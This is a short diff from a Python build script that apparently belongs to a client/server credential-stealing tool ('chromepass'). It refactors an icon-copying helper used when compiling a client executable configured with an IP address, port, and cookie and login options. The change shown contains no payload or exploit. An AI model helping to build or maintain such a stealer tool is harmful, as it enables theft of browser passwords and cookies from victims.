@@ -84,6 +84,13 @@ def copy_after_compilation(src_path, dist_path, filename):
     return False
 
 
+def copy_icon(src_path, dist_path, linux=False):
+    if not linux:
+        shutil.copyfile(src_path, dist_path)
+    elif os.path.exists(dist_path):
+        os.remove(dist_path)
+
+
 def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool=False, error_message="None", cookies=False, login=False, port=80, nobuild=True):
     if nobuild:
         return True
@@ -103,19 +110,12 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
     dist_path = f"{dist_dir}/{filename}.exe"
     if os.path.exists(temp_path):
         print("[+] Building Client")
-        shutil.copyfile(f"{icon_dir}/{icon}",
-                        f"{template_dir}/{chromepass_base}/client.ico")
+        copy_icon(f"{icon_dir}/{icon}",
+                  f"{template_dir}/{chromepass_base}/client.ico")
         script_replace(temp_path, replacement_map, build_path)
         return compile_client(build_command, src_path, dist_path, "Client")
     print(f"[-] Error, file not found: {temp_path}")
     return False
-
-
-def copy_icon(src_path, dist_path, linux=False):
-    if not linux:
-        shutil.copyfile(src_path, dist_path)
-    elif os.path.exists(dist_path):
-        os.remove(dist_path)
 
 
 def build_server(filename="server", icon="server.ico", port=80, nobuild=True, linux=False):
